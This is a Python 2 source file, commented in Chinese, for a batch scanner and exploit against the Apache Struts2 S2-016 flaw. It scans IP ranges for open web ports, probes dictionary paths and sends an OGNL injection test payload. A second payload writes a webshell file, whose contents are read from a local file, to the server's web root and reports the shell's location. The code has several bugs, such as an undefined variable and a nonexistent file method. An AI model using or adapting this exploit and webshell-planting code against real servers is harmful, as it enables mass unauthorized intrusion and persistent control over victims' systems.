#coding=utf-8
import os
import re
import sys
import json
import time
import urllib
import socket
import requests
'''Powered by Chongrui'''

'''IP工具类'''
class IPReverse():
	#获取页面内容
	def getPage(self,ip,page):
	    r = requests.get("http://dns.aizhan.com/index.php?r=index/domains&ip=%s&page=%d" % (ip,page))
	    return r

	#获取最大的页数
	def getMaxPage(self,ip):
	    r = self.getPage(ip,1)
	    json_data = {}
	    json_data = r.json()
	    if json_data == None:
	    	return None
	    maxcount = json_data[u'conut']
	    maxpage = int(int(maxcount)/20) + 1    
	    return maxpage

	#获取域名列表
	def getDomainsList(self,ip):
	    maxpage = self.getMaxPage(ip)
	    if maxpage == None:
	    	return None
	    result = []
	    for x in xrange(1,maxpage+1):
	        r = self.getPage(ip,x)
	        result.append(r.json()[u"domains"])
	    return result

'''通用扫描类'''
class Scanner():
	#验证指定的IP和port是否开放
	def portScanner(self,ip,port=80,timeout=0.001):
	    server = (ip,port)
	    sockfd = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	    sockfd.settimeout(timeout)
	    ret = sockfd.connect_ex(server)  #返回0则成功
	    if not ret:
	        sockfd.close()
	        print '%s:%s is opened...' % (ip,port)
	        return True
	    else:
	        sockfd.close()
	        print ip,' not open'
	        return False

	#字符串IP转化为数字的IP
	def ip2num(self,ip):
	    lp = [int(x) for x in ip.split('.')]
	    return lp[0] << 24 | lp[1] << 16 | lp[2] << 8 |lp[3]

	#数字的IP转化为字符串
	def num2ip(self,num):
	    ip = ['','','','']
	    ip[3] = (num & 0xff)
	    ip[2] = (num & 0xff00) >> 8
	    ip[1] = (num & 0xff0000) >> 16
	    ip[0] = (num & 0xff000000) >> 24
	    return '%s.%s.%s.%s' % (ip[0],ip[1],ip[2],ip[3])

	#计算输入的ip范围
	def iprange(self,ip1,ip2):
	    num1 = self.ip2num(ip1)
	    num2 = self.ip2num(ip2)
	    tmp = num2 - num1
	    if tmp < 0:
	        return None
	    else:
	        return num1,num2,tmp
	#扫描函数
	def WebScanner(self,startip,endip,port=80):
	    ip_list = []
	    res = ()
	    res = self.iprange(startip,endip)
	    if res < 0:
	        print 'endip must be bigger than startone'
	        return None
	        sys.exit()
	    else:
	        for x in xrange(int(res[2])+1):
	            startipnum = self.ip2num(startip)
	            startipnum = startipnum + x
	            if self.portScanner(self.num2ip(startipnum),port):
	                ip_list.append(self.num2ip(startipnum))
	        return ip_list

'''Struts2攻击类'''
class StrutsExploit():

	'''constructor'''
	def __init__(self,filepath,shellname):
		self.filepath = filepath
		self.shellname = shellname
		f = open(self.filepath,'r')
		self.payload = '''redirect:${{%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3dfalse%2c%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c%23a%3d%23context%5b%22com.opensymphony.xwork2.dispatcher.HttpServletRequest%22%5d%2c%23b%3dnew+java.io.FileOutputStream(new+java.lang.StringBuilder(%23a.getRealPath(%22/%22)).append(@java.io.File@separator).append(%22{shellname}%22))%2c%23b.write(%23a.getParameter("t").getBytes())%2c%23b.close%28%29%2c%23p%3d%23context%5b%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%5d.getWriter%28%29%2c%23p.println%28%22DONE%22%29%2c%23p.flush%28%29%2c%23p.close%28%29}}'''.format(shellname=self.shellname)
		self.detect_str = '''redirect:${%23p%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23p.println(%22HACKER%22),%23p.close()}'''
		self.webshell = f.read()
		f.close()

	'''获取shell的URL''' 
	def getShellPath(self,url):
		rawurl = url
		count = 0
		i = 0
		lineIndex = []
		url = url.replace('http://','')
		for x in url:
			if x == '/':
				lineIndex.append(i)
				count += 1
			if count == 2:
				break
			i += 1
		if len(lineIndex) != 2:
			proDir = ''
			partOne = partOne = rawurl[0:lineIndex[0]+7]	
		else:
			proDir = url[lineIndex[0]:lineIndex[1]]	
			partOne = rawurl[0:lineIndex[0]+7]	
		shellpath = "%s%s/%s" % (partOne,proDir,self.shellname)
		return shellpath


	'''检测是否存在漏洞'''
	def detect(self,url):
		url = "%s?%s" % (url,self.detect_str)
		try:
			r = requests.get(url,timeout=10)
			page_content = r.content
			if page_content.find('HACKER') != -1:
				return True
			else:
				return False
		except Exception, e:
			print '[+]Exploit Failed:',e
			return False

	'''攻击 上传shell到根目录'''
	def getshell(self,url):
		target_url = "%s?%s" % (url,self.payload)
		data = {'t':self.webshell}
		try:
			r = requests.post(target_url,data=data,timeout=10)
			page_content = r.content
			if page_content.find('DONE') != -1:
				print '[+]Exploit Success,shell location:\n%s' % self.getShellPath(url)
			else:
				print '[+]Exploit Failed'
		except Exception, e:
			print '[+]Exploit Failed:',e
			return

'''struts2 s2_016批量扫描类'''
class Struts2Scanner():
	def __init__(self):
		self.exploit = StrutsExploit('2.jsp','system.jsp')
		self.iptool = Scanner()

	'''使用IP段扫描'''
	def scannerFromIPRange(self,startip,endip):
		f = open('struts.txt','a')
		keyfile = open('dict.txt','r')
		ipfile = open('ipfile.txt','a')
		keylist = keyfile.read().split('\n')
		ip_list = []
		ip_list = self.iptool.WebScanner(startip,endip)
		for x in ip_list:
			ipfile.writeline(x)
		for ip in iplist:
			if not self.iptool.portScanner(ip):
				continue
			for key in keylist:
				url = "http://%s/%s" % (ip,key)
				print url
				try:
					r = requests.get(url,timeout=0.05)
					if r.status_code == 200:
						if self.exploit.detect(url):
							f.writeline(url)
					else:
						continue
				except Exception, e:
					print e
					continue
		keyfile.close()
		f.close()
		ipfile.close()

	'''使用单个IP扫描'''
	def scannerFromIPList(self,ip):
		f = open('struts.txt','a')
		keyfile = open('dict.txt','r')
		keylist = keyfile.read().split('\n')
		for key in keylist:
			print ip,key
			if not self.iptool.portScanner(ip):
				continue
			url = "http://%s/%s" % (ip,key)
			print url
			try:
				r = requests.get(url,timeout=0.05)
				if r.status_code == 200:
					if self.exploit.detect(url):
						print "SSSUCESS........."
						f.writeline(url)
				else:
					return
			except Exception, e:
				print e
				return 
		keyfile.close()
		f.close()

'''
使用IP段文件进行扫描
文件中IP地址的形式为
A空格B=====>表示一个IP段
如：
1.1.1.1 2.2.2.2
'''
def IPRangeScanner():
	f = open('ip1.txt','r')
	ss = Struts2Scanner()
	for x in f.readlines():
		iplist = x.split(' ')
		try:
			ss.scannerFromIPRange(iplist[0],iplist[1])
		except Exception, e:
			raise e
			continue
	f.close()

'''
使用单个IP文件扫描
文件中IP地址为
A
B
...
如：
1.1.1.1
2.2.2.2
'''
def IPScanner():
	f = open('ip1.txt','r')
	ss = Struts2Scanner()
	for x in f.readlines():
		try:
			x = x.replace('\n','')
			ss.scannerFromIPList(x)
		except Exception, e:
			print e
			continue


if __name__ == '__main__':
	IPRangeScanner()

	

